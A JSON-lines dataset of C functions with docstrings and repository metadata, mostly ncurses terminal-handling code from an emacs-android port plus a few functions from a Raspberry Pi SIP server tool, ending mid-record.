{"docstring": "/*\n * This call does the same thing as the qiflush()/noqiflush() pair.  We know\n * for certain that SVr3 intrflush() tweaks the NOFLSH bit; on the other hand,\n * the match (in the SVr4 man pages) between the language describing NOFLSH in\n * termio(7) and the language describing qiflush()/noqiflush() in\n * curs_inopts(3x) is too exact to be coincidence.\n */\n", "func_signal": "NCURSES_EXPORT(int)\nNCURSES_SP_NAME(intrflush) (NCURSES_SP_DCLx WINDOW *win GCC_UNUSED, bool flag)", "code": "{\n    int result = ERR;\n    TERMINAL *termp;\n\n    T((T_CALLED(\"intrflush(%p,%d)\"), (void *) SP_PARM, flag));\n    if (SP_PARM == 0)\n\treturnCode(ERR);\n\n    if ((termp = TerminalOf(SP_PARM)) != 0) {\n\tTTY buf;\n\n\tBEFORE(\"intrflush\");\n\tbuf = termp->Nttyb;\n#ifdef TERMIOS\n\tif (flag)\n\t    buf.c_lflag &= (unsigned) ~(NOFLSH);\n\telse\n\t    buf.c_lflag |= (NOFLSH);\n\tresult = NCURSES_SP_NAME(_nc_set_tty_mode) (NCURSES_SP_ARGx &buf);\n#else\n\t/* FIXME */\n#endif\n\tif (result == OK) {\n\t    termp->Nttyb = buf;\n\t}\n\tAFTER(\"intrflush\");\n    }\n    returnCode(result);\n}", "path": "native\\tinfo\\lib_raw.c", "repo_name": "zielmicha/emacs-android", "stars": 141, "license": "None", "language": "c", "size": 833}
{"docstring": "/*\n * Free any memory related to soft labels, return an error.\n */\n", "func_signal": "static int\nslk_failed(NCURSES_SP_DCL0)", "code": "{\n    if ((0 != SP_PARM) && SP_PARM->_slk) {\n\tFreeIfNeeded(SP_PARM->_slk->ent);\n\tfree(SP_PARM->_slk);\n\tSP_PARM->_slk = (SLK *) 0;\n    }\n    return ERR;\n}", "path": "native\\tinfo\\lib_slk.c", "repo_name": "zielmicha/emacs-android", "stars": 141, "license": "None", "language": "c", "size": 833}
{"docstring": "/*\n * Check for mouse activity, returning nonzero if we find any.\n */\n", "func_signal": "static int\ncheck_mouse_activity(SCREEN *sp, int delay EVENTLIST_2nd(_nc_eventlist * evl))", "code": "{\n    int rc;\n\n#ifdef USE_TERM_DRIVER\n    rc = TCBOf(sp)->drv->testmouse(TCBOf(sp), delay);\n#else\n#if USE_SYSMOUSE\n    if ((sp->_mouse_type == M_SYSMOUSE)\n\t&& (sp->_sysmouse_head < sp->_sysmouse_tail)) {\n\trc = TW_MOUSE;\n    } else\n#endif\n    {\n\trc = _nc_timed_wait(sp,\n\t\t\t    TWAIT_MASK,\n\t\t\t    delay,\n\t\t\t    (int *) 0\n\t\t\t    EVENTLIST_2nd(evl));\n#if USE_SYSMOUSE\n\tif ((sp->_mouse_type == M_SYSMOUSE)\n\t    && (sp->_sysmouse_head < sp->_sysmouse_tail)\n\t    && (rc == 0)\n\t    && (errno == EINTR)) {\n\t    rc |= TW_MOUSE;\n\t}\n#endif\n    }\n#endif\n    return rc;\n}", "path": "native\\tinfo\\lib_getch.c", "repo_name": "zielmicha/emacs-android", "stars": 141, "license": "None", "language": "c", "size": 833}
{"docstring": "/*\n * Note:\n * this implementation may be wrong.  See the comment under intrflush().\n */\n", "func_signal": "NCURSES_EXPORT(void)\nNCURSES_SP_NAME(qiflush) (NCURSES_SP_DCL0)", "code": "{\n    int result = ERR;\n    TERMINAL *termp;\n\n    T((T_CALLED(\"qiflush(%p)\"), (void *) SP_PARM));\n    if ((termp = TerminalOf(SP_PARM)) != 0) {\n\tTTY buf;\n\n\tBEFORE(\"qiflush\");\n\tbuf = termp->Nttyb;\n#ifdef TERMIOS\n\tbuf.c_lflag &= (unsigned) ~(NOFLSH);\n\tresult = NCURSES_SP_NAME(_nc_set_tty_mode) (NCURSES_SP_ARGx &buf);\n#else\n\t/* FIXME */\n#endif\n\tif (result == OK)\n\t    termp->Nttyb = buf;\n\tAFTER(\"qiflush\");\n    }\n    returnVoid;\n}", "path": "native\\tinfo\\lib_raw.c", "repo_name": "zielmicha/emacs-android", "stars": 141, "license": "None", "language": "c", "size": 833}
{"docstring": "/*\n**\tClearScreen(blank)\n**\n**\tClear the physical screen and put cursor at home\n**\n*/\n", "func_signal": "static void\nClearScreen(NCURSES_SP_DCLx NCURSES_CH_T blank)", "code": "{\n    int i, j;\n    bool fast_clear = (clear_screen || clr_eos || clr_eol);\n\n    TR(TRACE_UPDATE, (\"ClearScreen() called\"));\n\n#if NCURSES_EXT_FUNCS\n    if (SP_PARM->_coloron\n\t&& !SP_PARM->_default_color) {\n\tNCURSES_SP_NAME(_nc_do_color) (NCURSES_SP_ARGx\n\t\t\t\t       (short) GET_SCREEN_PAIR(SP_PARM),\n\t\t\t\t       0,\n\t\t\t\t       FALSE,\n\t\t\t\t       NCURSES_SP_NAME(_nc_outch));\n\tif (!back_color_erase) {\n\t    fast_clear = FALSE;\n\t}\n    }\n#endif\n\n    if (fast_clear) {\n\tif (clear_screen) {\n\t    UpdateAttrs(SP_PARM, blank);\n\t    TPUTS_TRACE(\"clear_screen\");\n\t    NCURSES_SP_NAME(putp) (NCURSES_SP_ARGx clear_screen);\n\t    SP_PARM->_cursrow = SP_PARM->_curscol = 0;\n\t    position_check(SP_PARM,\n\t\t\t   SP_PARM->_cursrow,\n\t\t\t   SP_PARM->_curscol,\n\t\t\t   \"ClearScreen\");\n\t} else if (clr_eos) {\n\t    SP_PARM->_cursrow = SP_PARM->_curscol = -1;\n\t    GoTo(NCURSES_SP_ARGx 0, 0);\n\t    UpdateAttrs(SP_PARM, blank);\n\t    TPUTS_TRACE(\"clr_eos\");\n\t    NCURSES_SP_NAME(tputs) (NCURSES_SP_ARGx\n\t\t\t\t    clr_eos,\n\t\t\t\t    screen_lines(SP_PARM),\n\t\t\t\t    NCURSES_SP_NAME(_nc_outch));\n\t} else if (clr_eol) {\n\t    SP_PARM->_cursrow = SP_PARM->_curscol = -1;\n\t    UpdateAttrs(SP_PARM, blank);\n\t    for (i = 0; i < screen_lines(SP_PARM); i++) {\n\t\tGoTo(NCURSES_SP_ARGx i, 0);\n\t\tTPUTS_TRACE(\"clr_eol\");\n\t\tNCURSES_SP_NAME(putp) (NCURSES_SP_ARGx clr_eol);\n\t    }\n\t    GoTo(NCURSES_SP_ARGx 0, 0);\n\t}\n    } else {\n\tUpdateAttrs(SP_PARM, blank);\n\tfor (i = 0; i < screen_lines(SP_PARM); i++) {\n\t    GoTo(NCURSES_SP_ARGx i, 0);\n\t    for (j = 0; j < screen_columns(SP_PARM); j++)\n\t\tPutChar(NCURSES_SP_ARGx CHREF(blank));\n\t}\n\tGoTo(NCURSES_SP_ARGx 0, 0);\n    }\n\n    for (i = 0; i < screen_lines(SP_PARM); i++) {\n\tfor (j = 0; j < screen_columns(SP_PARM); j++)\n\t    CurScreen(SP_PARM)->_line[i].text[j] = blank;\n    }\n\n    TR(TRACE_UPDATE, (\"screen cleared\"));\n}", "path": "native\\tinfo\\tty_update.c", "repo_name": "zielmicha/emacs-android", "stars": 141, "license": "None", "language": "c", "size": 833}
{"docstring": "/*\n**\tInsStr(line, count)\n**\n**\tInsert the count characters pointed to by line.\n**\n*/\n", "func_signal": "static void\nInsStr(NCURSES_SP_DCLx NCURSES_CH_T * line, int count)", "code": "{\n    TR(TRACE_UPDATE, (\"InsStr(%p, %p,%d) called\",\n\t\t      (void *) SP_PARM,\n\t\t      (void *) line, count));\n\n    /* Prefer parm_ich as it has the smallest cost - no need to shift\n     * the whole line on each character. */\n    /* The order must match that of InsCharCost. */\n    if (parm_ich) {\n\tTPUTS_TRACE(\"parm_ich\");\n\tNCURSES_SP_NAME(tputs) (NCURSES_SP_ARGx\n\t\t\t\tTPARM_1(parm_ich, count),\n\t\t\t\tcount,\n\t\t\t\tNCURSES_SP_NAME(_nc_outch));\n\twhile (count) {\n\t    PutAttrChar(NCURSES_SP_ARGx CHREF(*line));\n\t    line++;\n\t    count--;\n\t}\n    } else if (enter_insert_mode && exit_insert_mode) {\n\tTPUTS_TRACE(\"enter_insert_mode\");\n\tNCURSES_SP_NAME(putp) (NCURSES_SP_ARGx enter_insert_mode);\n\twhile (count) {\n\t    PutAttrChar(NCURSES_SP_ARGx CHREF(*line));\n\t    if (insert_padding) {\n\t\tTPUTS_TRACE(\"insert_padding\");\n\t\tNCURSES_SP_NAME(putp) (NCURSES_SP_ARGx insert_padding);\n\t    }\n\t    line++;\n\t    count--;\n\t}\n\tTPUTS_TRACE(\"exit_insert_mode\");\n\tNCURSES_SP_NAME(putp) (NCURSES_SP_ARGx exit_insert_mode);\n    } else {\n\twhile (count) {\n\t    TPUTS_TRACE(\"insert_character\");\n\t    NCURSES_SP_NAME(putp) (NCURSES_SP_ARGx insert_character);\n\t    PutAttrChar(NCURSES_SP_ARGx CHREF(*line));\n\t    if (insert_padding) {\n\t\tTPUTS_TRACE(\"insert_padding\");\n\t\tNCURSES_SP_NAME(putp) (NCURSES_SP_ARGx insert_padding);\n\t    }\n\t    line++;\n\t    count--;\n\t}\n    }\n    position_check(SP_PARM, SP_PARM->_cursrow, SP_PARM->_curscol, \"InsStr\");\n}", "path": "native\\tinfo\\tty_update.c", "repo_name": "zielmicha/emacs-android", "stars": 141, "license": "None", "language": "c", "size": 833}
{"docstring": "/* TRACE */\n", "func_signal": "NCURSES_EXPORT(int)\nNCURSES_SP_NAME(raw) (NCURSES_SP_DCL0)", "code": "{\n    int result = ERR;\n    TERMINAL *termp;\n\n    T((T_CALLED(\"raw(%p)\"), (void *) SP_PARM));\n    if ((termp = TerminalOf(SP_PARM)) != 0) {\n\tTTY buf;\n\n\tBEFORE(\"raw\");\n\t_nc_setmode(O_BINARY);\n\n\tbuf = termp->Nttyb;\n#ifdef TERMIOS\n\tbuf.c_lflag &= (unsigned) ~(ICANON | ISIG | IEXTEN);\n\tbuf.c_iflag &= (unsigned) ~(COOKED_INPUT);\n\tbuf.c_cc[VMIN] = 1;\n\tbuf.c_cc[VTIME] = 0;\n#else\n\tbuf.sg_flags |= RAW;\n#endif\n\tresult = NCURSES_SP_NAME(_nc_set_tty_mode) (NCURSES_SP_ARGx &buf);\n\tif (result == OK) {\n\t    SP_PARM->_raw = TRUE;\n\t    SP_PARM->_cbreak = 1;\n\t    termp->Nttyb = buf;\n\t}\n\tAFTER(\"raw\");\n    }\n    returnCode(result);\n}", "path": "native\\tinfo\\lib_raw.c", "repo_name": "zielmicha/emacs-android", "stars": 141, "license": "None", "language": "c", "size": 833}
{"docstring": "/*\n * Enable (or disable) ncurses' interpretation of a keycode by adding (or\n * removing) the corresponding 'tries' entry.\n *\n * Do this by storing a second tree of tries, which records the disabled keys. \n * The simplest way to copy is to make a function that returns the string (with\n * nulls set to 0200), then use that to reinsert the string into the\n * corresponding tree.\n */\n", "func_signal": "NCURSES_EXPORT(int)\nNCURSES_SP_NAME(keyok) (NCURSES_SP_DCLx int c, bool flag)", "code": "{\n    int code = ERR;\n\n    T((T_CALLED(\"keyok(%p, %d,%d)\"), (void *) SP_PARM, c, flag));\n#ifdef USE_TERM_DRIVER\n    code = CallDriver_2(sp, kyOk, c, flag);\n#else\n    T((T_CALLED(\"keyok(%d,%d)\"), c, flag));\n    if (c >= 0) {\n\tint count = 0;\n\tchar *s;\n\tunsigned ch = (unsigned) c;\n\n\tif (flag) {\n\t    while ((s = _nc_expand_try(SP_PARM->_key_ok, ch, &count, 0)) != 0\n\t\t   && _nc_remove_key(&(SP_PARM->_key_ok), ch)) {\n\t\tcode = _nc_add_to_try(&(SP_PARM->_keytry), s, ch);\n\t\tfree(s);\n\t\tcount = 0;\n\t\tif (code != OK)\n\t\t    break;\n\t    }\n\t} else {\n\t    while ((s = _nc_expand_try(SP_PARM->_keytry, ch, &count, 0)) != 0\n\t\t   && _nc_remove_key(&(SP_PARM->_keytry), ch)) {\n\t\tcode = _nc_add_to_try(&(SP_PARM->_key_ok), s, ch);\n\t\tfree(s);\n\t\tcount = 0;\n\t\tif (code != OK)\n\t\t    break;\n\t    }\n\t}\n    }\n#endif\n    returnCode(code);\n}", "path": "native\\tinfo\\keyok.c", "repo_name": "zielmicha/emacs-android", "stars": 141, "license": "None", "language": "c", "size": 833}
{"docstring": "/*\n**\tClrUpdate()\n**\n**\tUpdate by clearing and redrawing the entire screen.\n**\n*/\n", "func_signal": "static void\nClrUpdate(NCURSES_SP_DCL0)", "code": "{\n    TR(TRACE_UPDATE, (T_CALLED(\"ClrUpdate\")));\n    if (0 != SP_PARM) {\n\tint i;\n\tNCURSES_CH_T blank = ClrBlank(NCURSES_SP_ARGx StdScreen(SP_PARM));\n\tint nonempty = min(screen_lines(SP_PARM),\n\t\t\t   NewScreen(SP_PARM)->_maxy + 1);\n\n\tClearScreen(NCURSES_SP_ARGx blank);\n\n\tTR(TRACE_UPDATE, (\"updating screen from scratch\"));\n\n\tnonempty = ClrBottom(NCURSES_SP_ARGx nonempty);\n\n\tfor (i = 0; i < nonempty; i++)\n\t    TransformLine(NCURSES_SP_ARGx i);\n    }\n    TR(TRACE_UPDATE, (T_RETURN(\"\")));\n}", "path": "native\\tinfo\\tty_update.c", "repo_name": "zielmicha/emacs-android", "stars": 141, "license": "None", "language": "c", "size": 833}
{"docstring": "/*\n * Expand a keycode into the string that it corresponds to, returning null if\n * no match was found, otherwise allocating a string of the result.\n */\n", "func_signal": "NCURSES_EXPORT(char *)\n_nc_expand_try(TRIES * tree, unsigned code, int *count, size_t len)", "code": "{\n    TRIES *ptr = tree;\n    char *result = 0;\n\n    if (code != 0) {\n\twhile (ptr != 0) {\n\t    if ((result = _nc_expand_try(ptr->child, code, count, len + 1))\n\t\t!= 0) {\n\t\tbreak;\n\t    }\n\t    if (ptr->value == code) {\n\t\t*count -= 1;\n\t\tif (*count == -1) {\n\t\t    result = typeCalloc(char, len + 2);\n\t\t    break;\n\t\t}\n\t    }\n\t    ptr = ptr->sibling;\n\t}\n    }\n    if (result != 0) {\n\tif (ptr != 0 && (result[len] = (char) ptr->ch) == 0)\n\t    *((unsigned char *) (result + len)) = 128;\n#ifdef TRACE\n\tif (len == 0 && USE_TRACEF(TRACE_MAXIMUM)) {\n\t    _tracef(\"expand_key %s %s\",\n\t\t    _nc_tracechar(CURRENT_SCREEN, (int) code),\n\t\t    _nc_visbuf(result));\n\t    _nc_unlock_global(tracef);\n\t}\n#endif\n    }\n    return result;\n}", "path": "native\\tinfo\\tries.c", "repo_name": "zielmicha/emacs-android", "stars": 141, "license": "None", "language": "c", "size": 833}
{"docstring": "/* Try to scroll up assuming given csr (miny, maxy). Returns ERR on failure */\n", "func_signal": "static int\nscroll_csr_forward(NCURSES_SP_DCLx\n\t\t   int n,\n\t\t   int top,\n\t\t   int bot,\n\t\t   int miny,\n\t\t   int maxy,\n\t\t   NCURSES_CH_T blank)", "code": "{\n    int i;\n\n    if (n == 1 && scroll_forward && top == miny && bot == maxy) {\n\tGoTo(NCURSES_SP_ARGx bot, 0);\n\tUpdateAttrs(SP_PARM, blank);\n\tTPUTS_TRACE(\"scroll_forward\");\n\tNCURSES_SP_NAME(putp) (NCURSES_SP_ARGx scroll_forward);\n    } else if (n == 1 && delete_line && bot == maxy) {\n\tGoTo(NCURSES_SP_ARGx top, 0);\n\tUpdateAttrs(SP_PARM, blank);\n\tTPUTS_TRACE(\"delete_line\");\n\tNCURSES_SP_NAME(putp) (NCURSES_SP_ARGx delete_line);\n    } else if (parm_index && top == miny && bot == maxy) {\n\tGoTo(NCURSES_SP_ARGx bot, 0);\n\tUpdateAttrs(SP_PARM, blank);\n\tTPUTS_TRACE(\"parm_index\");\n\tNCURSES_SP_NAME(tputs) (NCURSES_SP_ARGx\n\t\t\t\tTPARM_2(parm_index, n, 0),\n\t\t\t\tn,\n\t\t\t\tNCURSES_SP_NAME(_nc_outch));\n    } else if (parm_delete_line && bot == maxy) {\n\tGoTo(NCURSES_SP_ARGx top, 0);\n\tUpdateAttrs(SP_PARM, blank);\n\tTPUTS_TRACE(\"parm_delete_line\");\n\tNCURSES_SP_NAME(tputs) (NCURSES_SP_ARGx\n\t\t\t\tTPARM_2(parm_delete_line, n, 0),\n\t\t\t\tn,\n\t\t\t\tNCURSES_SP_NAME(_nc_outch));\n    } else if (scroll_forward && top == miny && bot == maxy) {\n\tGoTo(NCURSES_SP_ARGx bot, 0);\n\tUpdateAttrs(SP_PARM, blank);\n\tfor (i = 0; i < n; i++) {\n\t    TPUTS_TRACE(\"scroll_forward\");\n\t    NCURSES_SP_NAME(putp) (NCURSES_SP_ARGx scroll_forward);\n\t}\n    } else if (delete_line && bot == maxy) {\n\tGoTo(NCURSES_SP_ARGx top, 0);\n\tUpdateAttrs(SP_PARM, blank);\n\tfor (i = 0; i < n; i++) {\n\t    TPUTS_TRACE(\"delete_line\");\n\t    NCURSES_SP_NAME(putp) (NCURSES_SP_ARGx delete_line);\n\t}\n    } else\n\treturn ERR;\n\n#if NCURSES_EXT_FUNCS\n    if (FILL_BCE(SP_PARM)) {\n\tint j;\n\tfor (i = 0; i < n; i++) {\n\t    GoTo(NCURSES_SP_ARGx bot - i, 0);\n\t    for (j = 0; j < screen_columns(SP_PARM); j++)\n\t\tPutChar(NCURSES_SP_ARGx CHREF(blank));\n\t}\n    }\n#endif\n    return OK;\n}", "path": "native\\tinfo\\tty_update.c", "repo_name": "zielmicha/emacs-android", "stars": 141, "license": "None", "language": "c", "size": 833}
{"docstring": "/*\n * Initialize soft labels.\n * Called from newterm()\n */\n", "func_signal": "NCURSES_EXPORT(int)\n_nc_slk_initialize(WINDOW *stwin, int cols)", "code": "{\n    int i;\n    int res = OK;\n    size_t max_length;\n    SCREEN *sp;\n    int numlab;\n\n    T((T_CALLED(\"_nc_slk_initialize()\")));\n\n    assert(stwin);\n\n    sp = _nc_screen_of(stwin);\n    if (0 == sp)\n\treturnCode(ERR);\n\n    assert(TerminalOf(SP_PARM));\n\n    numlab = NumLabels;\n\n    if (SP_PARM->_slk) {\t/* we did this already, so simply return */\n\treturnCode(OK);\n    } else if ((SP_PARM->_slk = typeCalloc(SLK, 1)) == 0)\n\treturnCode(ERR);\n\n    if (!SP_PARM->slk_format)\n\tSP_PARM->slk_format = _nc_globals.slk_format;\n\n    /*\n     * If we use colors, vidputs() will suppress video attributes that conflict\n     * with colors.  In that case, we're still guaranteed that \"reverse\" would\n     * work.\n     */\n    if ((NoColorVideo & 1) == 0)\n\tSetAttr(SP_PARM->_slk->attr, A_STANDOUT);\n    else\n\tSetAttr(SP_PARM->_slk->attr, A_REVERSE);\n\n    SP_PARM->_slk->maxlab = (short) ((numlab > 0)\n\t\t\t\t     ? numlab\n\t\t\t\t     : MAX_SKEY(SP_PARM->slk_format));\n    SP_PARM->_slk->maxlen = (short) ((numlab > 0)\n\t\t\t\t     ? LabelWidth * LabelHeight\n\t\t\t\t     : MAX_SKEY_LEN(SP_PARM->slk_format));\n    SP_PARM->_slk->labcnt = (short) ((SP_PARM->_slk->maxlab < MAX_SKEY(SP_PARM->slk_format))\n\t\t\t\t     ? MAX_SKEY(SP_PARM->slk_format)\n\t\t\t\t     : SP_PARM->_slk->maxlab);\n\n    if (SP_PARM->_slk->maxlen <= 0\n\t|| SP_PARM->_slk->labcnt <= 0\n\t|| (SP_PARM->_slk->ent = typeCalloc(slk_ent,\n\t\t\t\t\t    (size_t) SP_PARM->_slk->labcnt))\n\t== NULL)\n\treturnCode(slk_failed(NCURSES_SP_ARG));\n\n    max_length = (size_t) SP_PARM->_slk->maxlen;\n    for (i = 0; i < SP_PARM->_slk->labcnt; i++) {\n\tsize_t used = max_length + 1;\n\n\tSP_PARM->_slk->ent[i].ent_text = (char *) _nc_doalloc(0, used);\n\tif (SP_PARM->_slk->ent[i].ent_text == 0)\n\t    returnCode(slk_failed(NCURSES_SP_ARG));\n\tmemset(SP_PARM->_slk->ent[i].ent_text, 0, used);\n\n\tSP_PARM->_slk->ent[i].form_text = (char *) _nc_doalloc(0, used);\n\tif (SP_PARM->_slk->ent[i].form_text == 0)\n\t    returnCode(slk_failed(NCURSES_SP_ARG));\n\n\tif (used > 1) {\n\t    memset(SP_PARM->_slk->ent[i].form_text, ' ', used - 1);\n\t}\n\tSP_PARM->_slk->ent[i].form_text[used - 1] = '\\0';\n\n\tSP_PARM->_slk->ent[i].visible = (char) (i < SP_PARM->_slk->maxlab);\n    }\n\n    res = _nc_format_slks(NCURSES_SP_ARGx cols);\n\n    if ((SP_PARM->_slk->win = stwin) == NULL) {\n\treturnCode(slk_failed(NCURSES_SP_ARG));\n    }\n\n    /* We now reset the format so that the next newterm has again\n     * per default no SLK keys and may call slk_init again to\n     * define a new layout. (juergen 03-Mar-1999)\n     */\n    _nc_globals.slk_format = 0;\n    returnCode(res);\n}", "path": "native\\tinfo\\lib_slk.c", "repo_name": "zielmicha/emacs-android", "stars": 141, "license": "None", "language": "c", "size": 833}
{"docstring": "/*\n**\tDelChar(count)\n**\n**\tDelete count characters at current position\n**\n*/\n", "func_signal": "static void\nDelChar(NCURSES_SP_DCLx int count)", "code": "{\n    int n;\n\n    TR(TRACE_UPDATE, (\"DelChar(%p, %d) called, position = (%ld,%ld)\",\n\t\t      (void *) SP_PARM, count,\n\t\t      (long) NewScreen(SP_PARM)->_cury,\n\t\t      (long) NewScreen(SP_PARM)->_curx));\n\n    if (parm_dch) {\n\tTPUTS_TRACE(\"parm_dch\");\n\tNCURSES_SP_NAME(tputs) (NCURSES_SP_ARGx\n\t\t\t\tTPARM_1(parm_dch, count),\n\t\t\t\tcount,\n\t\t\t\tNCURSES_SP_NAME(_nc_outch));\n    } else {\n\tfor (n = 0; n < count; n++) {\n\t    TPUTS_TRACE(\"delete_character\");\n\t    NCURSES_SP_NAME(putp) (NCURSES_SP_ARGx delete_character);\n\t}\n    }\n}", "path": "native\\tinfo\\tty_update.c", "repo_name": "zielmicha/emacs-android", "stars": 141, "license": "None", "language": "c", "size": 833}
{"docstring": "/*\n * Check if a string appears to be an absolute pathname.\n */\n", "func_signal": "NCURSES_EXPORT(bool)\n_nc_is_abs_path(const char *path)", "code": "{\n#if defined(__EMX__) || defined(__DJGPP__)\n#define is_pathname(s) ((((s) != 0) && ((s)[0] == '/')) \\\n\t\t  || (((s)[0] != 0) && ((s)[1] == ':')))\n#else\n#define is_pathname(s) ((s) != 0 && (s)[0] == '/')\n#endif\n    return is_pathname(path);\n}", "path": "native\\tinfo\\access.c", "repo_name": "zielmicha/emacs-android", "stars": 141, "license": "None", "language": "c", "size": 833}
{"docstring": "/* put char at lower right corner */\n", "func_signal": "static void\nPutCharLR(NCURSES_SP_DCLx const ARG_CH_T ch)", "code": "{\n    if (!auto_right_margin) {\n\t/* we can put the char directly */\n\tPutAttrChar(NCURSES_SP_ARGx ch);\n    } else if (enter_am_mode && exit_am_mode) {\n\t/* we can suppress automargin */\n\tTPUTS_TRACE(\"exit_am_mode\");\n\tNCURSES_SP_NAME(putp) (NCURSES_SP_ARGx exit_am_mode);\n\n\tPutAttrChar(NCURSES_SP_ARGx ch);\n\tSP_PARM->_curscol--;\n\tposition_check(SP_PARM,\n\t\t       SP_PARM->_cursrow,\n\t\t       SP_PARM->_curscol,\n\t\t       \"exit_am_mode\");\n\n\tTPUTS_TRACE(\"enter_am_mode\");\n\tNCURSES_SP_NAME(putp) (NCURSES_SP_ARGx enter_am_mode);\n    } else if ((enter_insert_mode && exit_insert_mode)\n\t       || insert_character || parm_ich) {\n\tGoTo(NCURSES_SP_ARGx\n\t     screen_lines(SP_PARM) - 1,\n\t     screen_columns(SP_PARM) - 2);\n\tPutAttrChar(NCURSES_SP_ARGx ch);\n\tGoTo(NCURSES_SP_ARGx\n\t     screen_lines(SP_PARM) - 1,\n\t     screen_columns(SP_PARM) - 2);\n\tInsStr(NCURSES_SP_ARGx\n\t       NewScreen(SP_PARM)->_line[screen_lines(SP_PARM) - 1].text +\n\t       screen_columns(SP_PARM) - 2, 1);\n    }\n}", "path": "native\\tinfo\\tty_update.c", "repo_name": "zielmicha/emacs-android", "stars": 141, "license": "None", "language": "c", "size": 833}
{"docstring": "/*\n * Issue a given span of characters from an array.\n * Must be functionally equivalent to:\n *\tfor (i = 0; i < num; i++)\n *\t    PutChar(ntext[i]);\n * but can leave the cursor positioned at the middle of the interval.\n *\n * Returns: 0 - cursor is at the end of interval\n *\t    1 - cursor is somewhere in the middle\n *\n * This code is optimized using ech and rep.\n */\n", "func_signal": "static int\nEmitRange(NCURSES_SP_DCLx const NCURSES_CH_T * ntext, int num)", "code": "{\n    int i;\n\n    TR(TRACE_CHARPUT, (\"EmitRange %d:%s\", num, _nc_viscbuf(ntext, num)));\n\n    if (erase_chars || repeat_char) {\n\twhile (num > 0) {\n\t    int runcount;\n\t    NCURSES_CH_T ntext0;\n\n\t    while (num > 1 && !CharEq(ntext[0], ntext[1])) {\n\t\tPutChar(NCURSES_SP_ARGx CHREF(ntext[0]));\n\t\tntext++;\n\t\tnum--;\n\t    }\n\t    ntext0 = ntext[0];\n\t    if (num == 1) {\n\t\tPutChar(NCURSES_SP_ARGx CHREF(ntext0));\n\t\treturn 0;\n\t    }\n\t    runcount = 2;\n\n\t    while (runcount < num && CharEq(ntext[runcount], ntext0))\n\t\truncount++;\n\n\t    /*\n\t     * The cost expression in the middle isn't exactly right.\n\t     * _cup_ch_cost is an upper bound on the cost for moving to the\n\t     * end of the erased area, but not the cost itself (which we\n\t     * can't compute without emitting the move).  This may result\n\t     * in erase_chars not getting used in some situations for\n\t     * which it would be marginally advantageous.\n\t     */\n\t    if (erase_chars\n\t\t&& runcount > SP_PARM->_ech_cost + SP_PARM->_cup_ch_cost\n\t\t&& can_clear_with(NCURSES_SP_ARGx CHREF(ntext0))) {\n\t\tUpdateAttrs(SP_PARM, ntext0);\n\t\tNCURSES_SP_NAME(putp) (NCURSES_SP_ARGx\n\t\t\t\t       TPARM_1(erase_chars, runcount));\n\n\t\t/*\n\t\t * If this is the last part of the given interval,\n\t\t * don't bother moving cursor, since it can be the\n\t\t * last update on the line.\n\t\t */\n\t\tif (runcount < num) {\n\t\t    GoTo(NCURSES_SP_ARGx\n\t\t\t SP_PARM->_cursrow,\n\t\t\t SP_PARM->_curscol + runcount);\n\t\t} else {\n\t\t    return 1;\t/* cursor stays in the middle */\n\t\t}\n\t    } else if (repeat_char && runcount > SP_PARM->_rep_cost) {\n\t\tbool wrap_possible = (SP_PARM->_curscol + runcount >=\n\t\t\t\t      screen_columns(SP_PARM));\n\t\tint rep_count = runcount;\n\n\t\tif (wrap_possible)\n\t\t    rep_count--;\n\n\t\tUpdateAttrs(SP_PARM, ntext0);\n\t\tNCURSES_SP_NAME(tputs) (NCURSES_SP_ARGx\n\t\t\t\t\tTPARM_2(repeat_char,\n\t\t\t\t\t\tCharOf(ntext0),\n\t\t\t\t\t\trep_count),\n\t\t\t\t\trep_count,\n\t\t\t\t\tNCURSES_SP_NAME(_nc_outch));\n\t\tSP_PARM->_curscol += rep_count;\n\n\t\tif (wrap_possible)\n\t\t    PutChar(NCURSES_SP_ARGx CHREF(ntext0));\n\t    } else {\n\t\tfor (i = 0; i < runcount; i++)\n\t\t    PutChar(NCURSES_SP_ARGx CHREF(ntext[i]));\n\t    }\n\t    ntext += runcount;\n\t    num -= runcount;\n\t}\n\treturn 0;\n    }\n\n    for (i = 0; i < num; i++)\n\tPutChar(NCURSES_SP_ARGx CHREF(ntext[i]));\n    return 0;\n}", "path": "native\\tinfo\\tty_update.c", "repo_name": "zielmicha/emacs-android", "stars": 141, "license": "None", "language": "c", "size": 833}
{"docstring": "// helper for logging messages to console (disabled if silent mode is active)\n", "func_signal": "static void log_message(char *message)", "code": "{\n\tif (!app_cfg.silent_mode)\n\t{\n\t\tfprintf(stderr, message);\n\t}\n}", "path": "tools\\c\\sip-tools\\sipserv.c", "repo_name": "binerry/RaspberryPi", "stars": 147, "license": "None", "language": "c", "size": 246}
{"docstring": "// display error and exit application\n", "func_signal": "static void error_exit(const char *title, pj_status_t status)", "code": "{\n\tif (!app_exiting)\n\t{\n\t\tapp_exiting = 1;\n\t\t\n\t\tpjsua_perror(\"SIP Call\", title, status);\n\t\t\n\t\t// check if player/recorder is active and stop them\n\t\tif (play_id != -1) pjsua_player_destroy(play_id);\n\t\tif (rec_id != -1) pjsua_recorder_destroy(rec_id);\n\t\t\n\t\t// hangup open calls and stop pjsua\n\t\tpjsua_call_hangup_all();\n\t\tpjsua_destroy();\n\t\t\n\t\texit(1);\n\t}\n}", "path": "tools\\c\\sip-tools\\sipserv.c", "repo_name": "binerry/RaspberryPi", "stars": 147, "license": "None", "language": "c", "size": 246}
{"docstring": "// helper for creating and registering sip-account\n", "func_signal": "static void register_sip(void)", "code": "{\n\tpj_status_t status;\n\t\n\tlog_message(\"Registering account ... \");\n\t\n\t// prepare account configuration\n\tpjsua_acc_config cfg;\n\tpjsua_acc_config_default(&cfg);\n\t\n\t// build sip-user-url\n\tchar sip_user_url[40];\n\tsprintf(sip_user_url, \"sip:%s@%s\", app_cfg.sip_user, app_cfg.sip_domain);\n\t\n\t// build sip-provder-url\n\tchar sip_provider_url[40];\n\tsprintf(sip_provider_url, \"sip:%s\", app_cfg.sip_domain);\n\t\n\t// create and define account\n\tcfg.id = pj_str(sip_user_url);\n\tcfg.reg_uri = pj_str(sip_provider_url);\n\tcfg.cred_count = 1;\n\tcfg.cred_info[0].realm = pj_str(app_cfg.sip_domain);\n\tcfg.cred_info[0].scheme = pj_str(\"digest\");\n\tcfg.cred_info[0].username = pj_str(app_cfg.sip_user);\n\tcfg.cred_info[0].data_type = PJSIP_CRED_DATA_PLAIN_PASSWD;\n\tcfg.cred_info[0].data = pj_str(app_cfg.sip_password);\n\t\n\t// add account\n\tstatus = pjsua_acc_add(&cfg, PJ_TRUE, &acc_id);\n\tif (status != PJ_SUCCESS) error_exit(\"Error adding account\", 